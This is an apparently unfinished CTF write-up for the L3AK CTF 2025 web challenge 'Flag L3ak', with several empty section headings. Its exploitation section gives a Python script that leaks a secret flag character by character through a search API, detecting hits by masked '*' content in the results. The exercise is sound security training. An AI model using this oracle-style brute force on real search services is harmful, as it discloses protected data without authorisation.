---
title: "L3AK25: Writeup for Web/Flag_L3ak"
date: 2025-07-14T09:31:01+01:00
tags: ["ctf", "write-up", "l3ak"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Flag L3ak"
summary: ""
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

* CTF: L3AK CTF 2025
* Challenge: Flag L3ak
* Category: Web Exploitation
* Points: 50 (698 solves)
* Description:

> What's the name of this CTF? Yk what to do 😉

* Author: [p._.k](https://discord.com/users/1267886144306282621)

[Challenge source (will update this when the ctf ends for reproducibility)](https://ctf.l3ak.team/files/a753e930cce5e57819041baba8c40dcd/flag_l3ak.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo0N30.aHTFkA.tJCqyTOLb1ZKlvP2QqdFxosJAcI)

## TL;DR

## Initial Analysis

## Task Analysis

## Exploitation

Armed with this knowledge, we need to do the following steps:

1. Establish a baseline of the response content where a hit occurs ('*' in the json)
2. brute-force the first charcter after `known` (query = L3AK{**a**)
3. If the response is a hit, then add one more character (?q=L3AK{a**a**); otherwise try a new one (?q=L3AK{**b**).
4. In the end, a full flag (?q=L3AK{flag_here}) can be leaked.

```python
#!/usr/bin/env python3

import string
import requests

URL = 'http://34.134.162.213:17000/api/search'

alphabet = string.printable.strip()
known = 'L3AK{'

print(f"[+] Starting brute-force with prefix: {known}")

while not known.endswith('}'):
    found = False
    for c in alphabet:
        probe = (known + c)[-3:]
        r = requests.post(URL, json={"query": probe})
        data = r.json()

        # Filter out decoy match (like post id 4) by checking for masked content
        for post in data.get('results', []):
            if '*' in post['content']:
                print(f"[+] Match found via mask for '{probe}' → adding '{c}' to flag")
                known += c
                found = True
                break

        if found:
            break

    if not found:
        print("[-] No matching character found — maybe charset is wrong or flag ended.")
        break

print(f"\n✅ Final reconstructed flag: {known}")
```

-- todo: GIF showcasing the running of the script

Flag is: `L3AK{L3ak1ng_th3_Fl4g??}`

## Conclusions

## References

